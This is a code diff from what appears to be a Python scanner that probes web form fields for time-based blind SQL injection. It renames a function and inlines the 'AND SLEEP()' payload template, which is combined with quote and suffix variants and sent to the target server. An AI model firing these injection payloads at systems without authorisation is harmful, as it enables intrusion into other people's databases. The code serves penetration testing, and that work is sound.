@@ -107,27 +107,22 @@ def calculateSleepTime(serverResponseTime):
 		return serverResponseTime * 0.5
 
 
-# Checks if a form field is vulnerable
-# Correctly forged data are passed to this function to test if the field is injectable
-def isVulnerable(url, method, headers, cookies, data):
+# Correctly forged data are passed to this function to test if the field is injectable or if the server is delayed by input
+def isDelayed(url, method, headers, cookies, data):
 	global sleepTime
 	if measureMeanServerResponseTime(url, method, headers, cookies, data) >= sleepTime:
 		return True
 	return False
 
-def checkDelayedServer
-
 def searchFieldVulnerabilities(url, method, headers, cookies, field, data):
 	mData = data.copy()
-	sql	  = '{} AND SLEEP({}) {}'
-
 	for q in QUOTE_TYPES:
 		for s in SQL_SUFFIXES:
 			suff = s
 			if suff == SQL_SUFFIXES[AND_SUFFIX_1]:
 				suff = suff.format(q, q, q)
-			mData[field] = data[field] + sql.format(q, sleepTime, suff)
-			if isVulnerable(url, method, headers, cookies, mData):
+			mData[field] = data[field] + '{} AND SLEEP({}) {}'.format(q, sleepTime, suff)
+			if isDelayed(url, method, headers, cookies, mData):
 				return {'quoteType':q, 'suffixType': suff}
 	return None
 
